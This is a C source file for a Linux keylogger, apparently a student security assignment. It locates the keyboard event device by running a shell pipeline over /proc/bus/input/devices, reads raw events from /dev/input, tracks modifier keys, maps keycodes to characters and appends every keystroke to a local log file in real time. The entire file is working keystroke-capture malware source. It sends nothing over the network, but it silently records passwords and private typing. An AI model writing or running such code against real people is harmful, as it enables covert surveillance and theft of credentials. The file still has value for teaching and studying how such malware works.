#include <stdio.h>
#include <fcntl.h>
#include <linux/input.h>
#include <sys/stat.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <errno.h>

#define LOGFILEPATH "/home/kali/Documents/escuela/Sec/TareaLogger/log.txt"

// Estado de las teclas modificadoras
static int shift_pressed = 0;
static int ctrl_pressed = 0;
static int alt_pressed = 0;
static int altgr_pressed = 0; // Añadido para manejar AltGr

char *getEventDevice();
const char *get_char_from_keycode(int keycode);

void log_key(int fd, FILE *fp);

int main() {
    char path_keyboard[64] = "/dev/input/";

    strcat(path_keyboard, getEventDevice());
    int device_keyboard = open(path_keyboard, O_RDONLY);
    if (device_keyboard == -1) {
        perror("Error opening device");
        exit(EXIT_FAILURE);
    }

    FILE *fp = fopen(LOGFILEPATH, "a");
    if (!fp) {
        perror("Error opening log file");
        close(device_keyboard);
        exit(EXIT_FAILURE);
    }

    log_key(device_keyboard, fp);

    fclose(fp);
    close(device_keyboard);

    return 0;
}

char *getEventDevice() {
    static char event[8];
    char *command = "cat /proc/bus/input/devices | grep -C 4 keyboard | grep -E -o 'event[0-9]'";
    FILE *pipe = popen(command, "r");
    if (!pipe) {
        perror("Error opening pipe");
        exit(EXIT_FAILURE);
    }
    if (fgets(event, sizeof(event), pipe) == NULL) {
        perror("Error reading pipe");
        pclose(pipe);
        exit(EXIT_FAILURE);
    }
    pclose(pipe);
    event[strcspn(event, "\n")] = 0; // Remove newline character
    return event;
}

const char *get_char_from_keycode(int keycode) {
    switch (keycode) {
        case KEY_A: return shift_pressed ? "A" : "a";
        case KEY_B: return shift_pressed ? "B" : "b";
        case KEY_C: return shift_pressed ? "C" : "c";
        case KEY_D: return shift_pressed ? "D" : "d";
        case KEY_E: return shift_pressed ? "E" : "e";
        case KEY_F: return shift_pressed ? "F" : "f";
        case KEY_G: return shift_pressed ? "G" : "g";
        case KEY_H: return shift_pressed ? "H" : "h";
        case KEY_I: return shift_pressed ? "I" : "i";
        case KEY_J: return shift_pressed ? "J" : "j";
        case KEY_K: return shift_pressed ? "K" : "k";
        case KEY_L: return shift_pressed ? "L" : "l";
        case KEY_M: return shift_pressed ? "M" : "m";
        case KEY_N: return shift_pressed ? "N" : "n";
        case KEY_O: return shift_pressed ? "O" : "o";
        case KEY_P: return shift_pressed ? "P" : "p";
        case KEY_Q: 
            if (altgr_pressed) { // Añadido para manejar AltGr + Q
                return "@";
            } else {
                return shift_pressed ? "Q" : "q";
            }
        case KEY_R: return shift_pressed ? "R" : "r";
        case KEY_S: return shift_pressed ? "S" : "s";
        case KEY_T: return shift_pressed ? "T" : "t";
        case KEY_U: return shift_pressed ? "U" : "u";
        case KEY_V: return shift_pressed ? "V" : "v";
        case KEY_W: return shift_pressed ? "W" : "w";
        case KEY_X: return shift_pressed ? "X" : "x";
        case KEY_Y: return shift_pressed ? "Y" : "y";
        case KEY_Z: return shift_pressed ? "Z" : "z";
        case KEY_1: return shift_pressed ? "!" : "1";
        case KEY_2: return shift_pressed ? "\"" : "2";
        case KEY_3: return shift_pressed ? "#" : "3";
        case KEY_4: return shift_pressed ? "$" : "4";
        case KEY_5: return shift_pressed ? "%" : "5";
        case KEY_6: return shift_pressed ? "&" : "6";
        case KEY_7: return shift_pressed ? "/" : "7";
        case KEY_8: return shift_pressed ? "(" : "8";
        case KEY_9: return shift_pressed ? ")" : "9";
        case KEY_0: return shift_pressed ? "=" : "0";
        case KEY_MINUS: return shift_pressed ? "?" : "\'";
        case KEY_102ND: return shift_pressed ? ">" : "<";
        case KEY_BACKSPACE: return "\b";
        case KEY_TAB: return "\t";
        case KEY_LEFTBRACE: return shift_pressed ? "¨" : "`"; // Corregido el uso de la secuencia de escape
        case KEY_RIGHTBRACE: return shift_pressed ? "*" : "+";
        case KEY_ENTER: return "\n";
        case KEY_EQUAL: return shift_pressed ? "=":"0";
        case KEY_BACKSLASH: return shift_pressed ? "]" : "}";
        case KEY_SEMICOLON: return shift_pressed ? ":" : ";";
        case KEY_APOSTROPHE: return shift_pressed ? "[" : "{";
        case KEY_GRAVE: return shift_pressed ? "~" : "`";
        case KEY_COMMA: return shift_pressed ? ";" : ",";
        case KEY_DOT: return shift_pressed ? ":" : ".";
        case KEY_SLASH: return shift_pressed ? "_" : "-";
        case KEY_SPACE: return " ";
        case KEY_CAPSLOCK: return ""; // No visible character
            return ""; // Function keys
        default: return ""; // No mapping for this keycode
    }
}

void log_key(int fd, FILE *fp) {
    struct input_event ev;
    while (1) {
        ssize_t n = read(fd, &ev, sizeof(ev));
        if (n == (ssize_t)-1) {
            perror("Error reading from device");
            exit(EXIT_FAILURE);
        }
        if (ev.type == EV_KEY) {
            if (ev.value == 1) { // Key press event
                // Actualiza el estado de las teclas modificadoras
                if (ev.code == KEY_LEFTSHIFT || ev.code == KEY_RIGHTSHIFT) {
                    shift_pressed = 1;
                }
                if (ev.code == KEY_LEFTCTRL || ev.code == KEY_RIGHTCTRL) {
                    ctrl_pressed = 1;
                }
                if (ev.code == KEY_LEFTALT) {
                    alt_pressed = 1;
                }
                if (ev.code == KEY_RIGHTALT) { // Añadido para manejar AltGr
                    altgr_pressed = 1;
                }

                const char *c = get_char_from_keycode(ev.code);
                if (c && *c) {
                    fputs(c, fp);
                    fflush(fp); // Ensure the log is updated in real-time
                }
            } else if (ev.value == 0) { // Key release event
                // Actualiza el estado de las teclas modificadoras
                if (ev.code == KEY_LEFTSHIFT || ev.code == KEY_RIGHTSHIFT) {
                    shift_pressed = 0;
                }
                if (ev.code == KEY_LEFTCTRL || ev.code == KEY_RIGHTCTRL) {
                    ctrl_pressed = 0;
                }
                if (ev.code == KEY_LEFTALT) {
                    alt_pressed = 0;
                }
                if (ev.code == KEY_RIGHTALT) { // Añadido para manejar AltGr
                    altgr_pressed = 0;
                }
            }
        }
    }
}